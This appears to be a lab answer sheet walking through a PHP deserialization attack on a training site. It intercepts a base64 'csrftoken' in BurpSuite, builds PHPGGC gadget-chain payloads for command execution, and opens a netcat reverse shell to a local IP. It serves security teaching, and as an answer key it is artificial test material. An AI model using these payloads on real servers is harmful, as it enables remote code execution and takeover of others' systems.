# PHP Deserialization Answersheet

**Step 1:** Navigate to "PHP Website:16664" link
<kbd> <img src="1.png" /> </kbd>
<br /> <br />


**Step 2:** Provide the necessary information and click on "submit" button.
<kbd> <img src="2.png" /> </kbd>
<br /> <br />


**Step 3:** Capture the request in BurpSuite proxy and Observe the "csrftoken" parameter contains the Base64 data.
<kbd> <img src="3.png" /> </kbd>
<br /> <br />


**Step 4:** While decoding the value with Base64, we are able to identify the serealized data.
<kbd> <img src="4.png" /> </kbd>
<br /> <br />


**Step 5:** Send request captured in **Step 3** to the Burp Repeater 
<kbd> <img src="5.png" /> </kbd>
<br /> <br />


**Step 6:** Download the PHPGGC utility from the following location to generate the serealized payload using the following command and capture the payload
PHPGGC Location: https://github.com/ambionics/phpggc
```
./phpggc -b slim/rce1 system id
```
<kbd> <img src="6.png" /> </kbd>
<br /> <br />


**Step 7:** Replace the payload generated in **Step 6** in parameter "csrftoken" in request captured in **Step 5** and send request and observe the serve respond with the output of command "id".
<kbd> <img src="7.png" /> </kbd>
<br /> <br />


**Step 8:** Start the listener using the following command
```
nc -nlvp 6666
```
<kbd> <img src="8.png" /> </kbd>
<br /> <br />


**Step 9:** Capture the system IP Address and used that to generate the payload of reverse shell using the following command and capture the payload
```
./phpggc -b slim/rce1 "nc 192.168.29.88 6666 -e /bin/sh"
```
<kbd> <img src="9.png" /> </kbd>
<br /> <br />


**Step 10:** Repalce the payload catured in **Step 9** in "csrftoken" paramter in **Step 5** and click on "send" button.
<kbd> <img src="10.png" /> </kbd>
<br /> <br />

**Step 10:** We received the connection on reverse shell and use the whoami, uname -e command to extract the server information.
<kbd> <img src="11.png" /> </kbd>
<br /> <br />